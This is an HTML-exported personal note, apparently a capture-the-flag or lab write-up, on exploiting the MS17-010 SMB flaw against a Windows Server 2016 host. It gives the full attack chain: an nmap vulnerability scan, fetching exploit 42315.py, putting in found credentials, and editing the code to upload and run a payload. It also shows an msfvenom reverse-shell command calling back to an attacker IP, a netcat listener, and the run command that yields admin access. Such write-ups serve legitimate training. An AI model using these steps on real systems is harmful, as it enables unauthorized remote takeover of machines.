<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ms17-010</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ms17-010</h1><br/>We begin by doing nmap again, but this time we use <strong>vuln</strong> script to check for vulnerabilities.<br /><br /><em><strong>nmap --script vuln 10.10.20.25 </strong></em>	[Note: Generally we should include ports with -p for efficiency]<br /><br />This will show <strong>ms17-010</strong> vulnerability.<br /><br /><strong>Note: </strong>As the server is not running windows 7, we cannot run “<strong>eternalblue</strong>” exploit directly from metasploit framework.<br /><br />Thus, we search for ms17-010 in exploit database.<br /><br /><img src="images/183-1.png" alt="images/183-1.png" /><br /><br />We will use the python code that supports <strong>Microsoft Windows 2016 R2</strong> (This was hinted in OS detection of initial nmap scan.<br /><br />Get the file to user working directory using.<br /><br /><em><strong>searchsploit -m windows/remote/42315.py</strong></em><br /><br /><strong>Note: </strong>This will require <strong>python2</strong><br />(So impacket also has be installed for python2. [pip2 install impacket])<br /><br />Then examine the file and edit the following:<br /> 	<br />1) We need to give values in username and password.<br />Luckily we have 2 usernames and passwords.<br /><strong><br />Note:</strong> While enumerating the machine earlier, I tried to RDP into the machine using the gained credentials.<br />Both the users couldn&#39;t login. However, the error message of user <strong>Jill</strong> suggested that her password is expired.<br />Thus for our python program lets start with <strong>Bob</strong> and <strong>!P@$$W0rD!123</strong><br /><br />2) Starting from Line 916. Comment out the following. The following lines are used to create a file bane “pwned.txt” as a POC. However, we need a reverse shell, so we will replace it the following.<br /><br /><em>	#print(&#39;creating file c:\\pwned.txt on the target&#39;)<br />	#tid2 = smbConn.connectTree(&#39;C$&#39;)<br />	#fid2 = smbConn.createFile(tid2, &#39;/pwned.txt&#39;)<br />	#smbConn.closeFile(tid2, fid2)<br />	#smbConn.disconnectTree(tid2)</em><br /><br /><em><strong>	smb_send_file(smbConn, &#39;rshell.exe&#39;, &#39;C&#39;, &#39;/rshell.exe&#39; )<br />	service_exec(conn, r&#39;C:\rshell.exe&#39;)</strong></em><br /><br />3) Create a reverse shell using msfvenom<br /><br /><em><strong>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.11.72.31 LPORT=7777 -f exe -o rshell.exe</strong></em><br /><br />3) Get this prequisite file.<br /><em><strong>wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py</strong></em><br /><br />Keep both the <strong>42315.py, mysmb.py and rshell.exe</strong> in the same directory and run the exploit as follows:<br /><br />4) Start a netcat listner: <em><strong>nc -lvnp 7777</strong></em><br /><br />5) Run the exploit using python2: <br /><br /><em><strong>python2 42315.py 10.10.227.128<br /></strong></em><br /><br />We will get a reverse shell in our netcat listener. (we will directly foothold with admin access)<br /><br /><img src="images/183-2.png" alt="images/183-2.png" /><br /><br /><br />Thanks !!</div>
</body>
</html>
